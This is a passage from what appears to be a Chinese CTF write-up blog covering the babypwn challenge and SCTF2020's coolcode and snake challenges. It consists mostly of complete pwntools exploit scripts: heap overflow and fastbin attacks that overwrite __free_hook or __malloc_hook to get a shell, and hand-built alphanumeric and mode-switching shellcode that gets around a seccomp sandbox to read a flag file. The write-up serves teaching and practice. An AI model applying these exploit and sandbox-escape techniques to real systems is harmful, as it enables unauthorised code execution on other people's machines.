class="number">0x80</span>+(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0xc0</span>,<span class="number">0x200</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">0xd0</span>)</span><br><span class="line">dele(<span class="number">0xf0</span>)</span><br><span class="line">dele(<span class="number">0x410</span>)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0xf8</span>,<span class="number">3</span>,p64(byte-<span class="number">0x86e60</span>-<span class="number">0x10</span>))</span><br><span class="line">dele(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0x18</span>,<span class="number">3</span>,p64(byte+<span class="number">0x2f9310</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">16</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>))</span><br><span class="line">edit(<span class="number">0x20</span>,<span class="number">16</span>,p64(<span class="number">2</span>)+p64(<span class="number">3</span>))</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span> :</span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x02babypwn"><a href="#0x02babypwn" class="headerlink" title="0x02babypwn"></a>0x02babypwn</h3><p>利用show()负数泄露libc，利用malloc(0)实现堆溢出（0-1为最大无符号整形）</p><p>利用思路：</p><p>fastbin attcak在top_chunk附近踩出合适size。</p><p>修改top_chunk至__free_hook附近。</p><p>覆盖__free_hook为system。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(name))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">show(-<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c5710</span></span><br><span class="line">success(<span class="string">&quot;libc : &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x10</span>,<span class="string">&quot;oooo\n&quot;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x30</span>,<span class="string">&quot;oooo\n&quot;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)+p64(<span class="number">0x51</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x30</span>,<span class="string">&quot;oooo\n&quot;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x10</span>,<span class="string">&quot;oooo\n&quot;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x40</span>,<span class="string">&quot;oooo\n&quot;</span>)<span class="comment">#3</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>)+p64(libc.address+<span class="number">0x3c4b30</span>)+<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x40</span>,<span class="string">&quot;/bin/sh\n&quot;</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span>+p64(libc.address+<span class="number">0x3c5c50</span>)[:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffffff</span>)+<span class="string">&quot;\x00&quot;</span>*<span class="number">0xb28</span>+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#print hex(libc.sym[&#x27;__free_hook&#x27;])</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2020</title>
      <link href="/2020/07/07/SCTF2020/"/>
      <url>/2020/07/07/SCTF2020/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01coolcode"><a href="#0x01coolcode" class="headerlink" title="0x01coolcode"></a>0x01coolcode</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>16的一道pwn题，开了sandbox：</p><span id="more"></span><p><img src="https://img-blog.csdnimg.cn/20200706093615364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTE2OTc3,size_16,color_FFFFFF,t_70" alt="img"></p><p>禁用open，但fstat函数系统调用号为5，想到利用retf控制cs修改运行模式为32位汇编（open在32位下调用号正好为5）</p><p>同时看到堆可执行：</p><p> <code>       0x1607000          0x1628000 rwxp    21000 0      [heap]</code></p><p>于是可以在堆上部shellcode，但输入堆的时候有check只能是数字和大写字母，且长度为0x20，因此一般的shellcode转化工具因太长无法使用，只能手撸。</p><p>能用的只能是部分xor和pop&#x2F;push这样的指令，可以先构造执行read，之后的输入就没check的限制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                xor al,0x41</span></span><br><span class="line"><span class="string">                xor byte ptr [rsi+0x48],al</span></span><br><span class="line"><span class="string">                xor byte ptr [rsi+0x4b],al</span></span><br><span class="line"><span class="string">                xor byte ptr [rsi+0x4c],al</span></span><br><span class="line"><span class="string">                xor byte ptr [rsi+0x4a],al</span></span><br><span class="line"><span class="string">                xor al,0x41</span></span><br><span class="line"><span class="string">                xor al,0x53</span></span><br><span class="line"><span class="string">                xor byte ptr [rsi+0x48],al</span></span><br><span class="line"><span class="string">                push rbx</span></span><br><span class="line"><span class="string">                push rbx</span></span><br><span class="line"><span class="string">                pop rax</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">        sc += <span class="string">&#x27;M2WND&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用xor和’M2WND’构造出syscall执行read(0,堆地址,size)</p><p>ruan师傅<img src="file:///C:\Users\admin\AppData\Local\Temp\SGPicFaceTpBq\20852\77B2E8F6.png" alt="img"><img src="file:///C:\Users\admin\AppData\Local\Temp\SGPicFaceTpBq\20852\77B2FB64.png" alt="img"></p><p>哦对了，跳到堆上执行的方法是利用idx为负数（-24）改write的got为堆地址，利用show()函数触发到堆上执行，之后执行了一次read会便可持续往下部署sellcode但要把控好距离。具体看脚本+调试：</p><p>read（用于之后的shellcode写入）-&gt;mmap（申请映射空间用于读入flag）-&gt;open（利用retfq控制程序跳到映射空间执行32为汇编）-&gt;read-&gt;write</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./CoolCode&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot; :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;O&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;O&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor al,0x41</span></span><br><span class="line"><span class="string">xor byte ptr [rsi+0x48],al</span></span><br><span class="line"><span class="string">xor byte ptr [rsi+0x4b],al</span></span><br><span class="line"><span class="string">xor byte ptr [rsi+0x4c],al</span></span><br><span class="line"><span class="string">xor byte ptr [rsi+0x4a],al</span></span><br><span class="line"><span class="string">xor al,0x41</span></span><br><span class="line"><span class="string">xor al,0x53</span></span><br><span class="line"><span class="string">xor byte ptr [rsi+0x48],al</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">sc += <span class="string">&#x27;M2WND&#x27;</span></span><br><span class="line">add(-<span class="number">34</span>,sc)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#read()</span></span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push r11</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x4d</span>+<span class="string">&#x27;\x90&#x27;</span>*<span class="number">3</span>+sc)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># mmap 0xcafe000  mmap(0xcafe000,0x1000,7,34,0,0)</span></span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edi,0xcafe000</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mov esi,0x1000</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">xor dl,7</span></span><br><span class="line"><span class="string">push 0x22</span></span><br><span class="line"><span class="string">pop r10</span></span><br><span class="line"><span class="string">xor r8,r8</span></span><br><span class="line"><span class="string">dec r8</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">mov eax,9</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># read(0,0xcafe000,0x100)</span></span><br><span class="line">sc += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsp,0xcafe200</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mov esi,0xcafe000</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x58</span>+<span class="string">&#x27;\x90&#x27;</span>*<span class="number">2</span>+sc)</span><br><span class="line"><span class="comment"># open(flag) and &#x27;add esp,8&#x27; and &#x27;retf&#x27;</span></span><br><span class="line">sc = <span class="string">&#x27;h\x01\x01\x01\x01\x814$`f\x01\x01h./fl\x89\xe31\xc91\xd2j\x05X\xcd\x80&#x27;</span>+<span class="string">&#x27;\x83\xc4\x08&#x27;</span>+<span class="string">&#x27;\xcb&#x27;</span></span><br><span class="line">sc = sc.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x90&quot;</span>)</span><br><span class="line"><span class="comment">#read+write</span></span><br><span class="line">sc += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,0xcafe400</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">inc rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x200</span>,<span class="string">&quot;\x90&quot;</span>)</span><br><span class="line">sc += p64(<span class="number">0xcafe000</span>)+p64(<span class="number">0x23</span>)+p32(<span class="number">0xcafe080</span>)+p32(<span class="number">0x33</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(sc)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>这次我们先覆盖exit的got表为ret来绕过check,这样我们就可以直接在堆上写shellcode，然后覆盖free的got表，利用dele触发shellcode。</p><p>shellcode的编写过程就是先执行read将之后的shellcode读到bss段，之后retfq切换32位汇编并跳到bss上继续执行open_x86的操作，最后read and write读出flag。</p><p><strong>要注意的几点</strong>：</p><p>open函数的参数传递：</p><p>eax &#x3D; 0x05 系统调用号、ebx &#x3D; filename 文件名、ecx &#x3D; flags 置零即可、edx &#x3D; mode 置零即可。</p><p>然后就是再构造文件名’flag’的时候由于是32的模式，要注意错位的问题。</p><p>还有就是注意理解retfq执行的操作为pop rip，pop cs（cs &#x3D; 0x23代表32位模式，cs &#x3D; 0x33代表64位模式），所以要注意栈中的参数位置。retfq跳转过去的时候程序已经切换成了32位模式，要注意平衡好esp的地址</p><p>最后还得回到64位模式下调用，再调用一次retfq。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./CoolCode&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot; :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">push 0x60</span></span><br><span class="line"><span class="string">mov esi,0x1010101</span></span><br><span class="line"><span class="string">xor esi,0x1612601</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov esp,esi</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">open_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x60272b</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">mov rdi,0x3</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x60</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">readflag=asm(read_flag,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">add(-<span class="number">22</span>,<span class="string">&#x27;\xc3&#x27;</span>)</span><br><span class="line">add(-<span class="number">37</span>,asm(read,arch=<span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">payload=p64(<span class="number">0x602710</span>)+p64(<span class="number">0x23</span>)+asm(open_x86)+readflag</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x02-snake"><a href="#0x02-snake" class="headerlink" title="0x02 snake"></a>0x02 snake</h3><p>程序是是一个贪吃蛇，当蛇死后的leave words存在堆溢出，正好可以伪造下一个堆的size。</p><p>利用思路：</p><p>首先既然可以伪造size就想办法构造overlap，先将存放name的chunk0删除，申请新的chunk0大小为0x68（为之后的fastbin attack）准备。</p><p>之后利用scanf输入很长的字符串触发malloc_consolidate()作用为：</p><p>1、检查fastbin是否初始化，如果未初始化，则进行初始化。</p><p>2、如果fastbin初始化，则按照一定的顺序合并fastbin中的chunk放入unsorted bin中</p><p>这样一来放入unsorted bin的堆内就存在执行main_arena的指针，然后将它申请回来利用get_name+restart泄露libc</p><p>之后再leave words时候修改chunk1（也就是最开始的chunk0）的size为0x91，造成chunk0和chunk1的overlop。</p><p>最后fastbin attack改malloc_hook到one_gadget拿shell。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 